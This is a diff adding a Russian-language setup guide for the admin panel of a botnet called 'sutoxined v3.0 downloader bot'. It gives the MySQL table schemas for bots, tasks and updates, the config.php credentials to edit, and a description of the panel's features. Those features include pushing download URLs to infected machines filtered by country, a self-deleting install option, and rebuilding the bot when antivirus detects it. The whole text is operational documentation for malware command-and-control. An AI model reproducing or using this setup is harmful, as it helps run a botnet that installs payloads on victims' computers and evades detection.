@@ -1,0 +1,103 @@
+                __    
+               /\ \__                __            
+   ____  __  __\ \ ,_\   ___   __  _/\_\    ___    
+  /',__\/\ \/\ \\ \ \/  / __`\/\ \/'\/\ \ /' _ `\  
+ /\__, `\ \ \_\ \\ \ \_/\ \L\ \/>  </\ \ \/\ \/\ \ 
+ \/\____/\ \____/ \ \__\ \____//\_/\_\\ \_\ \_\ \_\
+  \/___/  \/___/   \/__/\/___/ \//\/_/ \/_/\/_/\/_/
+     	   sutoxined v3.0 downloader bot
+
+==================================
+ Справка по работе с админкой
+==================================
+Для начала работы вам необходимо создать базу (например "sutoxin") с помощью каких-либо
+MySQL-мэнеджеров, например phpMyAdmin. или вручную (create database sutoxin; use sutoxin) и 
+затем выполнить в базе следующие SQL-запросы: 
+
+CREATE TABLE `botnet_bots` (
+  `bot_uid` varchar(32) NOT NULL default '',
+  `bot_name` text NOT NULL,
+  `bot_ip` text NOT NULL,
+  `bot_time` text NOT NULL,
+  `bot_date` text NOT NULL,
+  `bot_country` text NOT NULL,
+  PRIMARY KEY  (`bot_uid`)
+) ENGINE=MyISAM DEFAULT CHARSET=cp1251;
+
+INSERT INTO `botnet_bots` VALUES ('66666666666666666666666666666666', 
+'Cytech@2007', '666.666.666.666', '666', '06:06:06 06.06.06', 'HELL');
+
+CREATE TABLE `botnet_config` 
+(
+  `refresh_rate` text NOT NULL,
+  `bots_pagelimit` text NOT NULL
+) ENGINE=MyISAM DEFAULT CHARSET=cp1251;
+
+INSERT INTO `botnet_config` VALUES ('15', '20');
+
+CREATE TABLE `botnet_tasks` 
+(
+  `id` int(10) unsigned NOT NULL auto_increment,
+  `task_id` text NOT NULL,
+  `command` text NOT NULL,
+  `status` text NOT NULL,
+  `execs` text NOT NULL,
+  `needexecs` text NOT NULL,
+  `bots` text NOT NULL,
+  PRIMARY KEY  (`id`)
+) ENGINE=MyISAM DEFAULT CHARSET=cp1251 AUTO_INCREMENT=39 ;
+
+CREATE TABLE `botnet_updates` 
+(
+  `id` int(10) unsigned NOT NULL auto_increment,
+  `update_id` text NOT NULL,
+  `url` text NOT NULL,
+  `status` text NOT NULL,
+  `updated` text NOT NULL,
+  `version` text NOT NULL,
+  PRIMARY KEY  (`id`)
+) ENGINE=MyISAM DEFAULT CHARSET=cp1251 AUTO_INCREMENT=35 ;
+
+Следующий шаг - настройка конфигурационного файла админки - config.php. Необходимо отредактировать
+ряд следующих значений:
+
+	// MySQL Configuration
+	$db_host 		= 		"localhost"; // хост базы данных   
+	$db_login 		= 		"root";      // логин базы данных
+	$db_password 		= 		"";       	 // пароль базы 
+	$db_database 		= 		"tasks";   	 // имя базы   
+	
+	// Admin Panel Configuration
+	$adm_login 		= 		"123"; 		// логин на админку
+	$adm_pass 		= 		"123";		// пароль на админку
+
+Внимание! Не оставляйте пароли дефолтными или простыми, это может привести к нежелательным последствиям. 
+Скрипты настроены. Контрольный центр включает в себя:
+
+ STATISTICS			
+ -	статистика ботнета, отображает общую статистику и статистику по странам. 
+ настройка частоты обращения к командному центру (rate).
+ 
+ TASKS CONTROL  	
+ -	система управления заданиями для ботнета, управление по странам/уиду/всеми сразу.
+ чистые загрузки устанавливаются флажком [x] delete self after execution. Также обращаю
+ ваше внимание, что в полее URLS можно задавать сразу несколько ссылок, через точку с 
+ запятой (";"), но !!!обратите внимание!!! - без пробелов!
+ 
+ UPDATE CENTER 
+ -	система обновления ботнета, например в случае если ваш бот был детектирован
+ каким-либо антивирусом или просто обновлен билд.
+	
+ BOTS CONTROL 
+ -	система контроля за ботами в индивидуальном порядке, отображает IP/имя 
+ компьютера/юзера, уникального идеинтификатора.
+
+[+] - начать выполнение задания.
+[-] - остановить выполнение задания.
+[~] - удалить задание/бота из базы.
+[#] - установить боту задание.
+
+Также обращаю ваше внимание на то, что чем ниже rate, тем выше нагрузка на вэб-сервер и MySQL, вплоть до 
+отказа в обслуживании данных сервисов - рекомендуемый rate от 15 до 25.
+
+В остальном возникнуть проблем не должно.
